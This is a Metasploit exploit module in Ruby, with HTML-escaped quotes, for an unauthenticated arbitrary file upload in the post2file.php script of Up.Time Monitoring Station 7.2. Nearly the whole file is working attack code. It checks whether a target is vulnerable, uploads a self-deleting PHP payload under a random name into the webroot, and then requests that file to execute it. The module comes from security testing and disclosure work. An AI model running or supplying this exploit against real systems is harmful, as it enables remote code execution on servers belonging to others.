# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Up.Time Monitoring Station post2file.php Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an arbitrary file upload vulnerability found within the Up.Time
          monitoring server 7.2 and below. A malicious entity can upload a PHP file into the
          webroot without authentication, leading to arbitrary code execution.
      },
      &#039;Author&#039;         =>
        [
          &#039;Denis Andzakovic <denis.andzakovic[at]security-assessment.com>&#039; # Vulnerability discoverey and MSF module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;100423&#039; ],
          [ &#039;BID&#039;, &#039;64031&#039;],
          [ &#039;URL&#039;, &#039;http://www.security-assessment.com/files/documents/advisory/Up.Time%207.2%20-%20Arbitrary%20File%20Upload.pdf&#039; ]
        ],
      &#039;Payload&#039;            =>
        {
          &#039;Space&#039; => 10000, # just a big enough number to fit any PHP payload
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;         => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;Up.Time 7.2&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 19 2013&#039;))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to the Up.Time instance&#039;, &#039;/&#039;]),
      Opt::RPORT(9999)
    ], self.class)
  end

  def check
    uri =  target_uri.path

    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;wizards&#039;, &#039;post2file.php&#039;)
    })

    if res and res.code == 500 and res.body.to_s =~ /<title><\/title>/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Unknown

  end

  def exploit
    print_status("#{peer} - Uploading PHP to Up.Time server")
    uri =  target_uri.path

    @payload_name = "#{rand_text_alpha(5)}.php"
    php_payload = get_write_exec_payload(:unlink_self => true)

    post_data = ({
      "file_name" => @payload_name,
      "script" => php_payload
    })

    print_status("#{peer} - Uploading payload #{@payload_name}")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(uri, &#039;wizards&#039;, &#039;post2file.php&#039;),
      &#039;vars_post&#039;   => post_data,
    })

    unless res and res.code == 200 and res.body.to_s =~ /<title><\/title>/
      fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
    end

    print_status("#{peer} - Executing payload #{@payload_name}")
    res = send_request_cgi({
      &#039;uri&#039;    => normalize_uri(uri, &#039;wizards&#039;, @payload_name),
      &#039;method&#039; => &#039;GET&#039;
    })
  end
end

